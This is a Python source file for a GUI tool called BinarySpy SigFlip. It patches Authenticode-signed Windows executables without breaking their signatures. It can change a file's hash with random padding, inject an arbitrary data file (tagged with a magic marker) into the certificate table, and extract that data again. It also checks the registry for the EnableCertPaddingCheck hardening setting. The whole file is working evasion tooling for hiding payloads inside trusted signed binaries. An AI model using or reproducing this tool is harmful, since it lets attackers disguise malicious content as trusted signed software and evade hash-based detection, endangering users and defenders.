"""
SigFlip Python Implementation for BinarySpy
Patch authenticode signed PE files without breaking the signature.
"""

import hashlib
import os
import struct
import subprocess
import threading
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, Optional, Tuple

import tkinter as tk
import ttkbootstrap as ttk
from tkinter import filedialog

import pefile


# Constants
IMAGE_DIRECTORY_ENTRY_SECURITY = 4

# Magic tag for embedded data
MAGIC_TAG = b"BinarySpy"


def calculate_pe_checksum(data: bytearray, original_checksum: int = 0) -> int:
    """
    Calculate PE checksum following Microsoft's algorithm.
    The checksum is calculated over the entire file, treating it as an array
    of 32-bit words, with the checksum field itself treated as 0.
    """
    checksum = 0
    size = len(data)
    
    # Process in 32-bit words
    for i in range(0, size - 3, 4):
        word = struct.unpack('<I', data[i:i+4])[0]
        checksum = (checksum + word) & 0xFFFFFFFF
        checksum = ((checksum & 0xFFFF) + (checksum >> 16)) & 0xFFFFFFFF
    
    checksum = ((checksum & 0xFFFF) + (checksum >> 16)) & 0xFFFFFFFF
    checksum = (checksum + size) & 0xFFFFFFFF
    
    return checksum


@dataclass
class SigFlipResult:
    success: bool
    message: str
    output_path: Optional[str] = None
    original_hash: Optional[str] = None
    new_hash: Optional[str] = None
    signature_valid: bool = False


class SigFlipAnalyzer:
    """SigFlip core functionality"""
    
    def __init__(self, logger: Optional[Callable[[str], None]] = None):
        self.logger = logger or (lambda _msg: None)
    
    def log(self, message: str) -> None:
        self.logger(message)
    
    def check_config(self) -> bool:
        """
        Check if system is hardened against authenticode padding.
        Returns True if hardened (won't work), False if vulnerable.
        """
        if os.name != 'nt':
            return False
        
        try:
            import winreg
            for subkey in [
                r"SOFTWARE\Microsoft\Cryptography\Wintrust\Config",
                r"SOFTWARE\Wow6432Node\Microsoft\Cryptography\Wintrust\Config"
            ]:
                try:
                    hkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, subkey)
                    value, _ = winreg.QueryValueEx(hkey, "EnableCertPaddingCheck")
                    winreg.CloseKey(hkey)
                    if value:
                        return True
                except (FileNotFoundError, OSError):
                    pass
        except Exception:
            pass
        
        return False
    
    def verify_pe_signature(self, pe_path: str) -> Tuple[bool, str]:
        """Verify PE file signature using PowerShell"""
        if os.name != 'nt':
            return False, "Signature verification only available on Windows"
        
        escaped_path = pe_path.replace("'", "''")
        ps_script = (
            f"$s=Get-AuthenticodeSignature -LiteralPath '{escaped_path}'; "
            "if($s.Status -eq 'Valid'){"
            "$n=''; if($s.SignerCertificate){$n=$s.SignerCertificate.Subject}; "
            "Write-Output ('VALID|' + $n)"
            "} else {Write-Output ('INVALID|' + $s.Status)}"
        )
        
        try:
            result = subprocess.run(
                ['powershell', '-NoProfile', '-Command', ps_script],
                capture_output=True, text=True, timeout=15
            )
            output = result.stdout.strip()
            if output.startswith('VALID|'):
                return True, output.partition('|')[2]
            return False, output.partition('|')[2] if '|' in output else output
        except Exception as e:
            return False, str(e)
    
    def calculate_sha256(self, data: bytes) -> str:
        """Calculate SHA256 hash"""
        return hashlib.sha256(data).hexdigest().upper()
    
    def _get_pe_offsets(self, data: bytearray) -> dict:
        """
        Get all necessary PE offsets.
        Returns dict with offsets for modifying certificate table.
        """
        # DOS header check
        if data[0:2] != b'MZ':
            raise ValueError("Not a valid PE file (missing MZ signature)")
        
        # e_lfanew - offset to PE header
        e_lfanew = struct.unpack('<I', data[60:64])[0]
        
        # PE signature check
        if data[e_lfanew:e_lfanew+4] != b'PE\x00\x00':
            raise ValueError("Not a valid PE file (missing PE signature)")
        
        # Optional header starts after PE signature (4) + FILE_HEADER (20)
        opt_header_offset = e_lfanew + 4 + 20
        
        # Get magic (PE32 or PE32+)
        magic = struct.unpack('<H', data[opt_header_offset:opt_header_offset+2])[0]
        
        if magic == 0x10b:  # PE32
            is_pe32_plus = False
            checksum_offset = opt_header_offset + 64
            sec_dir_offset = opt_header_offset + 128
        elif magic == 0x20b:  # PE32+
            is_pe32_plus = True
            checksum_offset = opt_header_offset + 88
            sec_dir_offset = opt_header_offset + 144
        else:
            raise ValueError(f"Unknown PE magic: 0x{magic:04X}")
        
        # Security directory (Certificate Table)
        cert_rva = struct.unpack('<I', data[sec_dir_offset:sec_dir_offset+4])[0]
        cert_size = struct.unpack('<I', data[sec_dir_offset+4:sec_dir_offset+8])[0]
        
        return {
            'e_lfanew': e_lfanew,
            'opt_header_offset': opt_header_offset,
            'is_pe32_plus': is_pe32_plus,
            'checksum_offset': checksum_offset,
            'sec_dir_offset': sec_dir_offset,
            'cert_rva': cert_rva,
            'cert_size': cert_size,
        }
    
    def bit_flip(self, pe_path: str, output_path: str, padding_size: int = 8) -> SigFlipResult:
        """
        Bit flip mode: Add random padding to certificate table.
        Changes PE hash without breaking signature.
        """
        try:
            # Check system config
            if self.check_config():
                return SigFlipResult(False, "System is hardened against authenticode padding")
            
            # Verify signature
            is_signed, signer = self.verify_pe_signature(pe_path)
            if not is_signed:
                return SigFlipResult(False, f"PE file is not signed: {signer}")
            
            self.log(f"[*] PE file is signed: {signer}")
            
            # Read entire PE file
            with open(pe_path, 'rb') as f:
                pe_data = bytearray(f.read())
            
            original_hash = self.calculate_sha256(bytes(pe_data))
            self.log(f"[+] Original SHA256: {original_hash}")
            
            # Get PE offsets
            offsets = self._get_pe_offsets(pe_data)
            cert_rva = offsets['cert_rva']
            cert_size = offsets['cert_size']
            
            if cert_rva == 0 or cert_size == 0:
                return SigFlipResult(False, "No certificate table found")
            
            self.log(f"[*] Certificate table: offset=0x{cert_rva:X}, size={cert_size} bytes")
            
            # WIN_CERTIFICATE structure:
            # dwLength (4 bytes) - length of certificate
            # wRevision (2 bytes) - should be 0x0200
            # wCertificateType (2 bytes) - WIN_CERT_TYPE_PKCS_SIGNED_DATA = 0x0002
            # bCertificate (variable) - the actual PKCS#7 SignedData
            
            dw_length = struct.unpack('<I', pe_data[cert_rva:cert_rva+4])[0]
            self.log(f"[*] WIN_CERTIFICATE dwLength: {dw_length} bytes")
            
            # Generate random padding
            padding = os.urandom(padding_size)
            self.log(f"[*] Adding {padding_size} bytes of random padding")
            
            # Insert padding right after the certificate data (at cert_rva + dw_length)
            insert_offset = cert_rva + dw_length
            pe_data[insert_offset:insert_offset] = padding
            
            # Update WIN_CERTIFICATE dwLength (add padding size)
            new_dw_length = dw_length + padding_size
            pe_data[cert_rva:cert_rva+4] = struct.pack('<I', new_dw_length)
            self.log(f"[*] Updated dwLength: {new_dw_length} bytes")
            
            # Update Security Directory size (add padding size)
            old_cert_size = struct.unpack('<I', pe_data[offsets['sec_dir_offset']+4:offsets['sec_dir_offset']+8])[0]
            new_cert_size = old_cert_size + padding_size
            pe_data[offsets['sec_dir_offset']+4:offsets['sec_dir_offset']+8] = struct.pack('<I', new_cert_size)
            self.log(f"[*] Updated Security Directory size: {new_cert_size} bytes")
            
            # Update checksum
            # First zero out the current checksum
            pe_data[offsets['checksum_offset']:offsets['checksum_offset']+4] = b'\x00\x00\x00\x00'
            
            # Calculate new checksum
            new_checksum = calculate_pe_checksum(pe_data)
            pe_data[offsets['checksum_offset']:offsets['checksum_offset']+4] = struct.pack('<I', new_checksum)
            self.log(f"[*] Updated Checksum: 0x{new_checksum:08X}")
            
            # Calculate new hash
            new_hash = self.calculate_sha256(bytes(pe_data))
            self.log(f"[+] New SHA256: {new_hash}")
            
            # Write output
            output_dir = os.path.dirname(output_path)
            if output_dir:
                os.makedirs(output_dir, exist_ok=True)
            
            with open(output_path, 'wb') as f:
                f.write(pe_data)
            
            self.log(f"[+] Saved modified PE to: {output_path}")
            
            # Verify signature
            is_valid, status = self.verify_pe_signature(output_path)
            if is_valid:
                self.log(f"[+] Signature is still valid!")
            else:
                self.log(f"[!] Signature verification: {status}")
            
            return SigFlipResult(
                success=True,
                message=f"Bit flip completed. Hash changed.",
                output_path=output_path,
                original_hash=original_hash,
                new_hash=new_hash,
                signature_valid=is_valid
            )
            
        except Exception as e:
            import traceback
            self.log(f"[!] Error: {str(e)}")
            self.log(traceback.format_exc())
            return SigFlipResult(False, f"Error: {str(e)}")
    
    def inject_data(self, pe_path: str, data_path: str, output_path: str) -> SigFlipResult:
        """
        Inject raw data into certificate table.
        Format: MAGIC_TAG + 4-byte size (little-endian) + raw_data + padding
        """
        try:
            # Check system config
            if self.check_config():
                return SigFlipResult(False, "System is hardened against authenticode padding")
            
            # Verify signature
            is_signed, signer = self.verify_pe_signature(pe_path)
            if not is_signed:
                return SigFlipResult(False, f"PE file is not signed: {signer}")
            
            self.log(f"[*] PE file is signed: {signer}")
            
            # Read data to inject
            with open(data_path, 'rb') as f:
                raw_data = f.read()
            
            data_size = len(raw_data)
            self.log(f"[*] Data size: {data_size} bytes")
            
            # Prepare payload: MAGIC_TAG + 4-byte size + raw_data
            size_bytes = struct.pack('<I', data_size)
            payload = MAGIC_TAG + size_bytes + raw_data
            
            # Add 8-byte alignment padding
            padding_size = (8 - (len(payload) % 8)) % 8
            if padding_size:
                payload += b'\x00' * padding_size
            
            self.log(f"[*] Total payload size: {len(payload)} bytes (with {padding_size} bytes alignment padding)")
            
            # Read entire PE file
            with open(pe_path, 'rb') as f:
                pe_data = bytearray(f.read())
            
            original_hash = self.calculate_sha256(bytes(pe_data))
            self.log(f"[+] Original SHA256: {original_hash}")
            
            # Get PE offsets
            offsets = self._get_pe_offsets(pe_data)
            cert_rva = offsets['cert_rva']
            cert_size = offsets['cert_size']
            
            if cert_rva == 0 or cert_size == 0:
                return SigFlipResult(False, "No certificate table found")
            
            self.log(f"[*] Certificate table: offset=0x{cert_rva:X}, size={cert_size} bytes")
            
            # WIN_CERTIFICATE dwLength
            dw_length = struct.unpack('<I', pe_data[cert_rva:cert_rva+4])[0]
            self.log(f"[*] WIN_CERTIFICATE dwLength: {dw_length} bytes")
            
            # Insert payload after certificate data
            insert_offset = cert_rva + dw_length
            pe_data[insert_offset:insert_offset] = payload
            
            # Update dwLength
            new_dw_length = dw_length + len(payload)
            pe_data[cert_rva:cert_rva+4] = struct.pack('<I', new_dw_length)
            self.log(f"[*] Updated dwLength: {new_dw_length} bytes")
            
            # Update Security Directory size
            old_cert_size = struct.unpack('<I', pe_data[offsets['sec_dir_offset']+4:offsets['sec_dir_offset']+8])[0]
            new_cert_size = old_cert_size + len(payload)
            pe_data[offsets['sec_dir_offset']+4:offsets['sec_dir_offset']+8] = struct.pack('<I', new_cert_size)
            self.log(f"[*] Updated Security Directory size: {new_cert_size} bytes")
            
            # Update checksum
            pe_data[offsets['checksum_offset']:offsets['checksum_offset']+4] = b'\x00\x00\x00\x00'
            new_checksum = calculate_pe_checksum(pe_data)
            pe_data[offsets['checksum_offset']:offsets['checksum_offset']+4] = struct.pack('<I', new_checksum)
            self.log(f"[*] Updated Checksum: 0x{new_checksum:08X}")
            
            # Calculate new hash
            new_hash = self.calculate_sha256(bytes(pe_data))
            self.log(f"[+] New SHA256: {new_hash}")
            
            # Write output
            output_dir = os.path.dirname(output_path)
            if output_dir:
                os.makedirs(output_dir, exist_ok=True)
            
            with open(output_path, 'wb') as f:
                f.write(pe_data)
            
            self.log(f"[+] Saved modified PE to: {output_path}")
            
            # Verify signature
            is_valid, status = self.verify_pe_signature(output_path)
            if is_valid:
                self.log(f"[+] Signature is still valid!")
            else:
                self.log(f"[!] Signature verification: {status}")
            
            return SigFlipResult(
                success=True,
                message=f"Data injected successfully. Data size: {data_size} bytes",
                output_path=output_path,
                original_hash=original_hash,
                new_hash=new_hash,
                signature_valid=is_valid
            )
            
        except Exception as e:
            import traceback
            self.log(f"[!] Error: {str(e)}")
            self.log(traceback.format_exc())
            return SigFlipResult(False, f"Error: {str(e)}")
    
    def extract_data(self, pe_path: str, output_path: str) -> Tuple[bool, str]:
        """
        Extract embedded data from modified PE file.
        Format: MAGIC_TAG + 4-byte size + raw_data
        Auto-renames output file if it already exists.
        """
        try:
            with open(pe_path, 'rb') as f:
                pe_data = f.read()
            
            # Find magic tag
            magic_pos = pe_data.find(MAGIC_TAG)
            if magic_pos == -1:
                return False, "Magic tag not found - file may not contain embedded data"
            
            self.log(f"[*] Found magic tag at offset: 0x{magic_pos:X}")
            
            # Read size (4 bytes after magic tag)
            size_offset = magic_pos + len(MAGIC_TAG)
            data_size = struct.unpack('<I', pe_data[size_offset:size_offset+4])[0]
            
            self.log(f"[*] Embedded data size: {data_size} bytes")
            
            # Extract data
            data_start = size_offset + 4
            data_end = data_start + data_size
            extracted = pe_data[data_start:data_end]
            
            self.log(f"[*] Extracted data size: {len(extracted)} bytes")
            
            # Ensure output has .bin extension
            if not output_path.lower().endswith('.bin'):
                output_path = output_path + '.bin'
            
            # Auto-rename if file exists
            final_path = output_path
            counter = 1
            while os.path.exists(final_path):
                base, ext = os.path.splitext(output_path)
                final_path = f"{base}_{counter}{ext}"
                counter += 1
            
            if final_path != output_path:
                self.log(f"[*] File renamed to: {final_path}")
            
            # Save to file
            with open(final_path, 'wb') as f:
                f.write(extracted)
            
            self.log(f"[+] Saved extracted data to: {final_path}")
            
            return True, f"Extracted {len(extracted)} bytes to {final_path}"
            
        except Exception as e:
            import traceback
            self.log(f"[!] Error: {str(e)}")
            return False, f"Error: {str(e)}"


class SigFlipWindow:
    """SigFlip GUI Window"""
    
    LANG = {
        "zh": {
            "title": "BinarySpy SigFlip",
            "tools_group": "SigFlip 工具",
            "pe_file": "PE 文件",
            "output_file": "输出文件",
            "data_file": "数据文件",
            "browse": "浏览",
            "bit_flip": "Bit Flip (修改哈希)",
            "inject": "Inject Data (注入数据)",
            "extract": "Extract Data (提取数据)",
            "mode_label": "操作模式",
            "padding_size": "填充大小",
            "execute": "执行",
            "clear_log": "清空日志",
            "language": "语言/Language",
            "need_pe_file": "请选择 PE 文件",
            "need_output": "请指定输出文件路径",
            "need_data_file": "请选择数据文件",
            "success": "操作成功",
            "failed": "操作失败",
            "signature_valid": "签名有效",
            "signature_invalid": "签名无效",
            "hardened_system": "系统已加固，无法执行此操作",
            "check_config": "检查系统配置",
        },
        "en": {
            "title": "BinarySpy SigFlip",
            "tools_group": "SigFlip Tools",
            "pe_file": "PE File",
            "output_file": "Output File",
            "data_file": "Data File",
            "browse": "Browse",
            "bit_flip": "Bit Flip (Change Hash)",
            "inject": "Inject Data",
            "extract": "Extract Data",
            "mode_label": "Mode",
            "padding_size": "Padding Size",
            "execute": "Execute",
            "clear_log": "Clear Log",
            "language": "Language",
            "need_pe_file": "Please select a PE file",
            "need_output": "Please specify output file path",
            "need_data_file": "Please select a data file",
            "success": "Success",
            "failed": "Failed",
            "signature_valid": "Signature valid",
            "signature_invalid": "Signature invalid",
            "hardened_system": "System hardened, operation not possible",
            "check_config": "Check System Config",
        },
    }
    
    def __init__(self, master):
        self.window = ttk.Toplevel(master)
        self.window.geometry("800x550")
        self.window.transient(master)
        
        try:
            icon_path = Path.cwd() / "logo.ico"
            if icon_path.exists():
                self.window.iconbitmap(str(icon_path))
        except Exception:
            pass
        
        self.current_lang = getattr(master, "current_lang", "zh")
        if self.current_lang not in self.LANG:
            self.current_lang = "zh"
        
        self.analyzer = SigFlipAnalyzer(self._append_log)
        
        self.pe_path = tk.StringVar()
        self.output_path = tk.StringVar()
        self.data_path = tk.StringVar()
        self.padding_size = tk.StringVar(value="8")
        self.mode = tk.StringVar(value="bit_flip")
        self.lang_var = tk.StringVar(value=self.current_lang)
        
        self._build_ui()
        self._apply_lang()
    
    def _tr(self, key: str) -> str:
        return self.LANG[self.current_lang][key]
    
    def _build_ui(self):
        main = ttk.Frame(self.window, padding=12)
        main.pack(fill=tk.BOTH, expand=True)
        
        # Language selector
        top_bar = ttk.Frame(main)
        top_bar.pack(fill=tk.X, pady=(0, 6))
        self.lang_lbl = ttk.Label(top_bar, text="")
        self.lang_lbl.pack(side=tk.LEFT)
        self.lang_combo = ttk.Combobox(top_bar, textvariable=self.lang_var, values=["zh", "en"], width=6, state="readonly")
        self.lang_combo.pack(side=tk.LEFT, padx=6)
        self.lang_combo.bind("<<ComboboxSelected>>", lambda _e: self._change_lang())
        
        # Path group
        self.path_group = ttk.LabelFrame(main, text="", padding=10)
        self.path_group.pack(fill=tk.X, pady=6)
        
        self.pe_lbl = ttk.Label(self.path_group, text="")
        self.pe_lbl.grid(row=0, column=0, sticky=tk.W)
        ttk.Entry(self.path_group, textvariable=self.pe_path, width=70).grid(row=0, column=1, padx=6, pady=4, sticky=tk.EW)
        self.pe_browse_btn = ttk.Button(self.path_group, text="", command=self._browse_pe)
        self.pe_browse_btn.grid(row=0, column=2, padx=4)
        
        self.output_lbl = ttk.Label(self.path_group, text="")
        self.output_lbl.grid(row=1, column=0, sticky=tk.W)
        ttk.Entry(self.path_group, textvariable=self.output_path, width=70).grid(row=1, column=1, padx=6, pady=4, sticky=tk.EW)
        self.output_browse_btn = ttk.Button(self.path_group, text="", command=self._browse_output)
        self.output_browse_btn.grid(row=1, column=2, padx=4)
        
        self.data_lbl = ttk.Label(self.path_group, text="")
        self.data_lbl.grid(row=2, column=0, sticky=tk.W)
        self.data_entry = ttk.Entry(self.path_group, textvariable=self.data_path, width=70)
        self.data_entry.grid(row=2, column=1, padx=6, pady=4, sticky=tk.EW)
        self.data_browse_btn = ttk.Button(self.path_group, text="", command=self._browse_data)
        self.data_browse_btn.grid(row=2, column=2, padx=4)
        
        self.path_group.columnconfigure(1, weight=1)
        
        # Options group
        self.opt_group = ttk.LabelFrame(main, text="", padding=10)
        self.opt_group.pack(fill=tk.X, pady=6)
        
        self.mode_lbl = ttk.Label(self.opt_group, text="")
        self.mode_lbl.grid(row=0, column=0, sticky=tk.W)
        self.rb_bit_flip = ttk.Radiobutton(self.opt_group, text="", variable=self.mode, value="bit_flip", command=self._on_mode_change)
        self.rb_bit_flip.grid(row=0, column=1, padx=6, sticky=tk.W)
        self.rb_inject = ttk.Radiobutton(self.opt_group, text="", variable=self.mode, value="inject", command=self._on_mode_change)
        self.rb_inject.grid(row=0, column=2, padx=6, sticky=tk.W)
        self.rb_extract = ttk.Radiobutton(self.opt_group, text="", variable=self.mode, value="extract", command=self._on_mode_change)
        self.rb_extract.grid(row=0, column=3, padx=6, sticky=tk.W)
        
        self.padding_lbl = ttk.Label(self.opt_group, text="")
        self.padding_lbl.grid(row=1, column=0, sticky=tk.W)
        self.padding_entry = ttk.Entry(self.opt_group, textvariable=self.padding_size, width=10)
        self.padding_entry.grid(row=1, column=1, padx=6, sticky=tk.W)
        
        # Action buttons
        action_group = ttk.Frame(main)
        action_group.pack(fill=tk.X, pady=6)
        
        self.execute_btn = ttk.Button(action_group, text="", command=self._execute)
        self.execute_btn.pack(side=tk.LEFT, padx=4)
        self.check_btn = ttk.Button(action_group, text="", command=self._check_config)
        self.check_btn.pack(side=tk.LEFT, padx=4)
        self.clear_btn = ttk.Button(action_group, text="", command=self._clear_log)
        self.clear_btn.pack(side=tk.RIGHT, padx=4)
        
        # Log
        self.log_text = tk.Text(main, height=18, bg="#10151d", fg="#d9f8e3", insertbackground="#d9f8e3", font=("Consolas", 10))
        self.log_text.pack(fill=tk.BOTH, expand=True, pady=8)
        
        self._on_mode_change()
    
    def _browse_pe(self):
        path = filedialog.askopenfilename(filetypes=[("PE files", "*.exe *.dll *.sys"), ("All files", "*.*")])
        if path:
            self.pe_path.set(path)
            base = os.path.splitext(path)[0]
            ext = os.path.splitext(path)[1]
            self.output_path.set(f"{base}_modified{ext}")
    
    def _browse_output(self):
        mode = self.mode.get()
        if mode == "extract":
            path = filedialog.asksaveasfilename(defaultextension=".bin", filetypes=[("Binary files", "*.bin"), ("All files", "*.*")])
        else:
            path = filedialog.asksaveasfilename(filetypes=[("PE files", "*.exe *.dll *.sys"), ("All files", "*.*")])
        if path:
            self.output_path.set(path)
    
    def _browse_data(self):
        path = filedialog.askopenfilename(filetypes=[("Binary files", "*.bin"), ("All files", "*.*")])
        if path:
            self.data_path.set(path)
    
    def _on_mode_change(self):
        mode = self.mode.get()
        
        # Data file entry: needed for inject mode only
        if mode == "inject":
            self.data_entry.config(state=tk.NORMAL)
            self.data_browse_btn.config(state=tk.NORMAL)
        else:
            self.data_entry.config(state=tk.DISABLED)
            self.data_browse_btn.config(state=tk.DISABLED)
        
        # Padding: only for bit_flip mode
        if mode == "bit_flip":
            self.padding_entry.config(state=tk.NORMAL)
        else:
            self.padding_entry.config(state=tk.DISABLED)
    
    def _change_lang(self):
        self.current_lang = self.lang_var.get()
        if self.current_lang not in self.LANG:
            self.current_lang = "zh"
        self._apply_lang()
    
    def _apply_lang(self):
        self.window.title(self._tr("title"))
        self.lang_lbl.config(text=self._tr("language"))
        self.path_group.config(text=self._tr("tools_group"))
        self.opt_group.config(text=self._tr("mode_label"))
        self.pe_lbl.config(text=self._tr("pe_file"))
        self.output_lbl.config(text=self._tr("output_file"))
        self.data_lbl.config(text=self._tr("data_file"))
        self.pe_browse_btn.config(text=self._tr("browse"))
        self.output_browse_btn.config(text=self._tr("browse"))
        self.data_browse_btn.config(text=self._tr("browse"))
        self.mode_lbl.config(text=self._tr("mode_label"))
        self.rb_bit_flip.config(text=self._tr("bit_flip"))
        self.rb_inject.config(text=self._tr("inject"))
        self.rb_extract.config(text=self._tr("extract"))
        self.padding_lbl.config(text=self._tr("padding_size"))
        self.execute_btn.config(text=self._tr("execute"))
        self.check_btn.config(text=self._tr("check_config"))
        self.clear_btn.config(text=self._tr("clear_log"))
    
    def _append_log(self, message: str):
        self.window.after(0, lambda: self._append_log_ui(message))
    
    def _append_log_ui(self, message: str):
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.see(tk.END)
    
    def _clear_log(self):
        self.log_text.delete("1.0", tk.END)
    
    def _check_config(self):
        hardened = self.analyzer.check_config()
        if hardened:
            self._append_log(f"[!] {self._tr('hardened_system')}")
        else:
            self._append_log(f"[+] System allows authenticode padding")
    
    def _execute(self):
        threading.Thread(target=self._execute_thread, daemon=True).start()
    
    def _execute_thread(self):
        pe_path = self.pe_path.get().strip()
        output_path = self.output_path.get().strip()
        mode = self.mode.get()
        
        if not pe_path:
            self._append_log(f"[!] {self._tr('need_pe_file')}")
            return
        
        if not output_path:
            self._append_log(f"[!] {self._tr('need_output')}")
            return
        
        self.window.after(0, lambda: self.execute_btn.config(state=tk.DISABLED))
        
        try:
            if mode == "bit_flip":
                padding_size = int(self.padding_size.get() or "8")
                result = self.analyzer.bit_flip(pe_path, output_path, padding_size)
            
            elif mode == "inject":
                data_path = self.data_path.get().strip()
                if not data_path:
                    self._append_log(f"[!] {self._tr('need_data_file')}")
                    return
                result = self.analyzer.inject_data(pe_path, data_path, output_path)
            
            elif mode == "extract":
                success, msg = self.analyzer.extract_data(pe_path, output_path)
                result = SigFlipResult(
                    success=success,
                    message=msg,
                    output_path=output_path
                )
            
            else:
                result = SigFlipResult(False, "Unknown mode")
            
            self._append_log("")
            self._append_log("=" * 60)
            if result.success:
                self._append_log(f"[+] {self._tr('success')}: {result.message}")
                if result.original_hash:
                    self._append_log(f"[+] Original SHA256: {result.original_hash}")
                if result.new_hash:
                    self._append_log(f"[+] New SHA256: {result.new_hash}")
                if result.signature_valid:
                    self._append_log(f"[+] {self._tr('signature_valid')}")
                elif result.signature_valid is False:
                    self._append_log(f"[!] {self._tr('signature_invalid')}")
            else:
                self._append_log(f"[!] {self._tr('failed')}: {result.message}")
            self._append_log("=" * 60)
            
        except Exception as e:
            self._append_log(f"[!] Error: {str(e)}")
        finally:
            self.window.after(0, lambda: self.execute_btn.config(state=tk.NORMAL))
